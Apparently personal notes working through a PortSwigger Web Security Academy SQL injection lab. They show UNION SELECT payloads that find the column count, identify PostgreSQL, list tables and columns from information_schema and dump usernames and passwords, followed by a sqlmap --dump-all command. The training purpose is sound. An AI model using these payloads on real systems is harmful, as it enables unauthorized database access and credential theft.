https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables
Confirm a single quotes causes 500, this indicata it could be vulnerable to SQL
So we select any data using `UNION SELECT` instead of simply `UNION` because we are injection a query into another
Let's start to see if proper handles a simple injection`/filter?category=Pets'UNION+SELECT+NULL,NULL--` and then confirm it is an PostgreSQL `/filter?category=Pets'UNION+SELECT+NULL,version()--`. Now to explore what tables are being used let's take a look to the following query
```url
/filter?category=Pets'UNION+SELECT+table_name,null+FROM+information_schema.tables--
```
now see `/filter?category=Pets'UNION+SELECT+column_name,null+FROM+information_schema.columns+WHERE+table_name='users'--` and realize that there are 
If we could retrieve data from certain column, you should use `from` keyword
```sql
/filter?category=Pets'+UNION+SELECT+username,+password+FROM+users--
```

### automated
You could easily do this lab with automated tools:
```bash
sqlmap --dump-all -u "https://0adc00b404a522928156e34000c8000d.web-security-academy.net/filter?category=Pets" -p category --level=3 --risk=3 --batch --dbs
```
